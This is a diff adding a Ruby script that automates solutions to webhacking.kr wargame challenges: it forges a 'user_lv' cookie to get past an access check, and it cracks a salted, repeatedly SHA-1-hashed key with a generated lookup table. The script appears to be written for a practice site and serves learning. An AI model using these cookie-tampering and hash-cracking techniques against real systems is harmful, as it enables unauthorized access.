@@ -1,0 +1,200 @@
+# frozen_string_literal: true
+
+require 'digest'
+
+module WebhackingKR
+  ##
+  # Challenge base
+  class ChallengeBase
+    DATA_DIR = File.join(__dir__, '..', '..', 'data')
+
+    @@successors = []
+
+    class << self
+      def inherited(subclass)
+        super
+        @@successors << subclass
+      end
+
+      def successors
+        @@successors
+      end
+    end
+
+    def initialize(shell, wargame, client)
+      @shell = shell
+      @wargame = wargame
+      @client = client
+
+      Dir.mkdir(data_dir) unless Dir.exist?(data_dir)
+    end
+
+    def exec; end
+
+    ##
+    # Prints a message
+    def log(message)
+      @shell.log("[challenge#{self.class::CHALLENGE}] #{message}")
+    end
+
+    def pwned
+      log('Pwned!')
+    end
+
+    def failed(message = 'Failed!')
+      log(message)
+    end
+
+    def solved
+      log('Already solved!')
+    end
+
+    ##
+    # Checks if the challenge has been done
+    def check(data)
+      n = format('%02d', self.class::CHALLENGE)
+
+      if data =~ /old-#{n} Pwned/
+        pwned
+        return
+      end
+
+      if data =~ /already solved/
+        solved
+        return
+      end
+
+      failed
+    end
+
+    ##
+    # Returns the data directory
+    def data_dir
+      File.join(DATA_DIR, "challenge#{self.class::CHALLENGE}")
+    end
+
+    ##
+    # Sends HTTP GET request
+    def get(query, headers = {})
+      cookie = headers['Cookie']
+      headers['Cookie'] = @wargame.session_id
+      headers['Cookie'] << "; #{cookie}" if cookie
+      request = Net::HTTP::Get.new(query, headers)
+      @client.request(request)
+    end
+
+    ##
+    # Sends HTTP POST request
+    def post(query, data = {}, headers = {})
+      cookie = headers['Cookie']
+      headers['Cookie'] = @wargame.session_id
+      headers['Cookie'] << "; #{cookie}" if cookie
+      request = Net::HTTP::Post.new(query, headers)
+      request.set_form_data(data)
+      @client.request(request)
+    end
+  end
+
+  ##
+  # Challenge 1
+  class Challenge1 < ChallengeBase
+    CHALLENGE = 1
+
+    QUERY = '/challenge/web-01/'
+
+    def exec
+      log('Sending cookie')
+      response = get(
+        QUERY,
+        { 'Cookie' => 'user_lv=3.5' }
+      )
+      check(response.body)
+    end
+  end
+
+  ##
+  # Challenge 4
+  class Challenge4 < ChallengeBase
+    CHALLENGE = 4
+
+    QUERY = '/challenge/web-04/'
+    SALT = 'salt_for_you'
+    FROM = 10_000_000
+    TO = 99_999_999
+    INTERVAL = 300_000
+    ROUNDS = 500
+    TABLE_FILE = 'table.dat'
+    HASH_LENGTH = 20
+
+    def exec
+      table_file = File.join(data_dir, TABLE_FILE)
+      File.open(table_file, 'w').close unless File.exist?(table_file)
+      table_size = File.size(table_file)
+      table_size /= HASH_LENGTH
+      file = File.open(table_file, 'r+b')
+      file.seek(table_size * HASH_LENGTH)
+      key = nil
+      log("Lookup table: #{table_size} hashes")
+      log('Generating lookup table and getting hashes')
+      i = FROM + table_size
+      loop do
+        if (!i.zero? && (i % INTERVAL).zero?) || i >= TO
+          file.rewind
+          response = get(QUERY)
+          match = %r(><b>([a-z0-9]{#{HASH_LENGTH * 2}})</b></td>).match(response.body)
+          unless match
+            failed
+            break
+          end
+          @hash = match[1]
+          log(@hash)
+          @hash = [@hash].pack('H*')
+
+          n = nil
+          until file.eof?
+            h = file.read(HASH_LENGTH)
+            next unless h == @hash
+
+            n = (file.pos - HASH_LENGTH) / HASH_LENGTH
+            break
+          end
+
+          if n
+            key = "#{n + FROM}#{SALT}"
+            break
+          end
+        end
+
+        h = "#{i}#{SALT}"
+        file.write(hash(h))
+
+        i += 1
+        break if i > TO
+      rescue Interrupt
+        file.close
+        return
+      end
+
+      file.close
+      unless key
+        failed('Key not found')
+        return
+      end
+
+      log("Key found: #{key}")
+      log('Submitting key')
+      response = post(
+        QUERY,
+        { 'key' => key }
+      )
+      check(response.body)
+    end
+
+    private
+
+    def hash(key)
+      ROUNDS.times { key = Digest::SHA1.hexdigest(key) }
+      [key].pack('H*')
+    end
+  end
+end
